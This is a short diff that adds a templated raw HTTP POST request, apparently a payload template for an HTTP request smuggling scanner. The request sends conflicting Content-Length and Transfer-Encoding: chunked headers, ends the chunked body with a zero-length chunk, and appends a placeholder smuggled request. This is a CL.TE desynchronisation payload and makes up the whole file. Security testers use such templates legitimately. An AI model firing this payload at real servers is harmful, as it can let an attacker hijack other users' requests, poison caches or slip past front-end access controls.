@@ -1,0 +1,8 @@
+POST / HTTP/1.1
+Host: {{hostname}}
+Content-Length: {{smuggled|length + 6}}
+Transfer-Encoding: chunked
+
+0
+
+{{smuggled}}
